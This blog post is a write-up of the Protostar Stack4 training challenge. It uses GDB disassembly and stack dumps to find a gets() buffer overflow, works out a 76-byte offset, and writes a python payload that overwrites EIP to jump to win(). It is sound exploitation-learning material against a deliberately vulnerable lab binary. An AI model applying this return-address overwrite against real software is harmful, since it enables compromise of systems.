---
layout: post
title: "B2B - Protostar, Stack4 (x86)"


---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 4

The fifth challenge of Protostar is "Stack 4". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack4
test
```

The program simply appears to take a single input, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the string "test" as it's input, and printed nothing. Once again, similar to our previous challenge - right?

Let's dig deeper again using GDB and the disassembler. Unlike last time, I want to list the functions first and make sure I'm not missing the obvious this time around:

```
(gdb) info functions
All defined functions:

File stack4/stack4.c:
int main(int, char **);
void win(void);
```

Let's first look at the main function:

```
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
```

This can be broken down into a higher level set of points:

- We grow the stack by 0x50
- Get our user input
- We notice that 'win' is never actually called, nor is there any specific value comparisons here. Strange.

Let's now disassemble and breakdown the win() function:

```
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 <win+0>:	push   ebp
0x080483f5 <win+1>:	mov    ebp,esp
0x080483f7 <win+3>:	sub    esp,0x18
0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:	call   0x804832c <puts@plt>
0x08048406 <win+18>:	leave  
0x08048407 <win+19>:	ret    
End of assembler dump.
```

- Pretty much just sets up the stack frame and prints something to the screen

Looking at the main function, we are going to want to drop a breakpoint on the gets() function as this should be vulnerable to a buffer overflow. So monitoring the flow from here will likely help us out.

```
b *main+16
```

We run the program with the input 'AAAABBBB'. We can step over our breakpoint once hit using 'ni' so we can examine our stack:

```
(gdb) x/30wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x42424242	0xbffffc00	0x080482e8 <--- input on this row
0xbffffc20:	0xb7ff1040	0x080495ec	0xbffffc58	0x08048449
0xbffffc30:	0xb7fd8304	0xb7fd7ff4	0x08048430	0xbffffc58
0xbffffc40:	0xb7ec6365	0xb7ff1040	0x0804843b	0xb7fd7ff4
0xbffffc50:	0x08048430	0x00000000	0xbffffcd8	0xb7eadc76
0xbffffc60:	0x00000001	0xbffffd04	0xbffffd0c	0xb7fe1848
0xbffffc70:	0xbffffcc0	0xffffffff
```

We can see that our input is being placed on the stack, however, continuing from this point results in a normal exit. What we want to do is try and abuse this vulnerable gets() function and run into some memory corruption issues.

Let's fire in a string of characters to see what happens if we write too much data. This is similar to the previous challenges, except in this instance we want to see if we can gain control of the instruction pointer (EIP) rather than pass some checks that have been designed by the programmer themselves. If you haven't done any EIP overwrites before, I recommend you have a read up on how they can be abused and exploited via overflows to redirect flow to the attacker's choice. Anyway, let's write our python output to a file and use this as our input:

```
python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"' > /tmp/stack4
```

By inspecting our stack with the above input, we can see our letters laid out in the order we wrote them in:

```
(gdb) x/35wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x42424242	0x43434343	0x44444444 <-- input starts on this row
0xbffffc20:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffffc30:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xbffffc40:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xbffffc50:	0x51515151	0x52525252	0x53535353	0x54545454
0xbffffc60:	0x55555555	0x56565656	0x57575757	0x58585858
0xbffffc70:	0x59595959	0x5a5a5a5a	0xb7ffef00	0x0804824b <-- input ends of this row
0xbffffc80:	0x00000001	0xbffffcc0	0xb7ff0626
```

Now let's continue stepping through our instructions and see what happens:

```
(gdb) ni
0x0804841e in main (argc=Cannot access memory at address 0x5353535b) at stack4/stack4.c:16
16	in stack4/stack4.c
(gdb) ni
Cannot access memory at address 0x53535357
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
```

Sweet - looks like we got a memory corruption error. This means some of our input ended up over writing the instruction pointer (EIP), resulting in our execution attempting to continue at address "0x54545454" (which in this case, is nothing). What we want to do here, is work out the offset to this address and replace "0x54545454" with the address of our win() function, which we identified before. This will ultimately redirect our flow of execution by forcing the EIP to point at our new address.

"0x54" is "T" in ASCII, so what we can either do is check the offset in memory by finding the difference in the stack addresses from the beginning of the input to the "TTTT", we can manually count the characters (lol), we can find which number of the alphabet "T" is and multiply by 4 to get our address. There are a number of ways. I am going to do the address offsets because I like to pretend I know how memory works.

​	"0xbffffc5c" - "0xbffffc10" = "0x4c" (76 in decimal)

As we can see our EIP value is being overwritten by the "TTTT", so we know that our input lands at the beginning of the EIP address. Giving us full control.

We can test this theory by using a payload of 76 'A' characters, and 4 'B' characters. If all is well, we should receive a 'Seg Fault' (memory corruption) pointing to "0x42424242". Let's test this:

```
$ python -c 'print "A"*76 + "B"*4' > /tmp/stack4
```

```
(gdb) r < /tmp/stack4
Starting program: /opt/protostar/bin/stack4 < /tmp/stack4

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

We can see that it errors when attempting to access the memory address "0x42424242". So now we have full control of EIP!

Finally, let's build a payload that gives us our junk buffer of 76 'A' characters, followed by the little endian representation of "0x080483f4", the first address of our win() function.

```
$ python -c 'print "A"*76 + "\xf4\x83\x04\x08"' > /tmp/stack4
```

In theory, this will now overwrite EIP with the address of win(), continue execution into this function and print our target win condition. We put a breakpoint at our gets(), step over to accept the piped input and dump our stack.

```
(gdb) x/30wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141 <-- start of input on this row
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x080483f4 <-- EIP overwrite, win() address
0xbffffc60:	0x00000000	0xbffffd04	0xbffffd0c	0xb7fe1848
0xbffffc70:	0xbffffcc0	0xffffffff
(gdb) x/wx 0xbffffc10+0x4c <-- our input start+offset
0xbffffc5c:	0x080483f4     <-- win() EIP overwrite
```

If we continue through our instructions 1 by 1, we eventually see that our EIP changes to point to the address of win():

```
(gdb) ni
0x0804841e in main (argc=Cannot access memory at address 0x41414149) at stack4/stack4.c:16 <-- corrupt EBP?
16	in stack4/stack4.c
(gdb) ni
win () at stack4/stack4.c:7
7	in stack4/stack4.c
(gdb) i r
eax            0xbffffc10	-1073742832
ecx            0xbffffc10	-1073742832
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc60	0xbffffc60
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x80483f4	0x80483f4 <win>     <--- excellent
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

The corrupt EBP shown above will likely cause a crash (I think) at the end when win() tries to return, but we should have our win condition print to the screen if we continue:

```
(gdb) c
Continuing.
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

Sweet! We got our successful EIP overwrite, changed the flow of execution to win() and then crashed. This crash could probably be patched by giving the EBP a legitimate address (something similar to an exit function (if one exists)) so upon returning it flows somewhere controlled and quits nicely. But I'll leave that to the reader!

